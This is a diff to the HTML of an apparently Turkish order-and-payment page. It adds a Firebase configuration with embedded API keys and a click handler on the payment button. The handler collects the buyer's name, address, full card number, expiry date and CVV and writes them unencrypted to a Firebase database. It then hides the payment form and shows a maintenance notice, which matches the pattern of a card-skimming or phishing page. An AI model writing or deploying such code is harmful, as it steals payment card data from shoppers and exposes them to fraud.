@@ -113,6 +113,24 @@
       font-size: 1rem;
     }
   </style>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyCQSPExHQKdgR2wMh0YG7YvGE2mFSftpvA",
+    authDomain: "viabonte.firebaseapp.com",
+    databaseURL: "https://viabonte-default-rtdb.firebaseio.com",
+    projectId: "viabonte",
+    storageBucket: "viabonte.firebasestorage.app",
+    messagingSenderId: "401795816209",
+    appId: "1:401795816209:web:32a6af97915dcc889ecab0",
+    measurementId: "G-WE1W35ET7C"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+</script>
+
 </head>
 <body>
 
@@ -227,5 +245,35 @@
       });
     });
   </script>
+
+<script>
+  document.querySelector(".payment-submit").addEventListener("click", function () {
+    const isim = document.querySelector(".form-section input[placeholder='Ad Soyad']").value;
+    const adres = document.querySelector(".form-section input[placeholder='Adres']").value;
+    const il = document.getElementById("il").value;
+    const ilce = document.getElementById("ilce").value;
+    const teslimat = document.querySelector(".form-section input[type='datetime-local']").value;
+    const kart = document.querySelector(".payment-section input[placeholder='Kart Numarası']").value;
+    const skt = document.querySelector(".payment-section input[placeholder='Son Kullanma Tarihi (AA/YY)']").value;
+    const cvv = document.querySelector(".payment-section input[placeholder='CVV']").value;
+
+    const yeniSiparis = { isim, adres, il, ilce, teslimat, kart, skt, cvv };
+    console.log("🚀 Gönderilen sipariş:", yeniSiparis);
+
+    const ref = db.ref("siparisler").push();
+    ref.set(yeniSiparis, (error) => {
+      if (error) {
+        console.error("❌ Firebase hata:", error);
+        alert("❌ Sipariş gönderilemedi.");
+      } else {
+        console.log("✅ Firebase'e sipariş başarıyla gönderildi.");
+      }
+    });
+
+    document.querySelector(".payment-section").style.display = "none";
+    document.getElementById("bakim-uyari").style.display = "block";
+  });
+</script>
+
 </body>
 </html>
